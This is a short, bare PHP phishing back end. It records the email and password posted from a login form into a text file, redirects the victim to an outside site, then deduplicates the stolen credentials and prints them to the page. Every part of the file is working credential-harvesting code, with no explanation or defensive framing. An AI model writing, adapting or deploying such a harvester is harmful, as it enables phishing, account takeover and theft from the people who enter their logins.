<?php
header('Location:http://zuphaims.com/4/4213099');
$message = $_POST['email'].":";
$message .= $_POST['pass']."\n" ;

file_put_contents('accounts0.txt', $message, FILE_APPEND);
?>

<?php
$lines = file("accounts0.txt"); // Get the file as an array
echo "<pre>-- Lines --\r\n";
var_dump($lines);

$lines = array_unique($lines); // Merge all duplicate lines
echo "\r\n-- Lines after array_unique() --\r\n";
var_dump($lines);

// Save as a new file
$file = fopen("filter0.txt", "w");

echo "\r\n-- File --\r\n";
var_dump($file);

echo "\r\n-- Lines Implode --\r\n";
var_dump(implode("", $lines));

echo "</pre>";

fwrite($file, implode("", $lines));
fclose($file);
?>